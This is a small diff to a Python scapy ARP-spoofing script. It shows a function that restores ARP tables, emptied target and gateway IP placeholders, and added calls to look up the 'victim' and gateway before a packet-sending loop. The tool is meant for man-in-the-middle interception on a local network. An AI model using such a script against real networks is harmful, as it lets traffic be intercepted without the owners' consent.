@@ -27,9 +27,11 @@ def restore(destination_ip, source_ip): #function to restore the ARP tables back
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False) #count=4 sends the packet 4 times
 
-target_ip = "ip of target"
-gateway_ip = "ip or router"
+target_ip = ""
+gateway_ip = ""
 
+get_victm(target_ip)
+get_gateway(gateway_ip)
 try:
     sent_packets_count = 0
     while True:
